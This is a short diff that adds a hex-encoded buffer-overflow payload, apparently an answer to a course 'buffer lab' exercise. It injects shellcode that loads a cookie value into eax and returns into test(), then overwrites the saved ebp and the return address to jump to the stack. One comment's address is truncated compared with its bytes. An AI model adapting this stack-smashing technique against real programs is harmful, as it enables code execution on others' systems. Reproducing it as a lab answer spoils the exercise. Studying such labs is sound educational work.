@@ -1,0 +1,13 @@
+b8 96 e0 36 20       	/* mov    $0x2036e096,%eax move cookie on stack return value */
+68 24 8e 04 08          /* push   $0x8048e2 next line of test() */
+c3                   	/* ret    11 bytes */
+00 00 00 00
+00 00 00 00 
+00 00 00 00 
+00 00 00 00
+00 00 00 00
+00
+FF FF FF FF /* volatile in to fix in assembly TODO: wtf why does it workkkkkk  old: 0x1aea3c56 */
+90 e0 36 20 /* int val shove cookie in there */
+10 2F 68 55 /* old ebp for test */
+B8 2E 68 55 /* address of the beginnign of the stack return value */
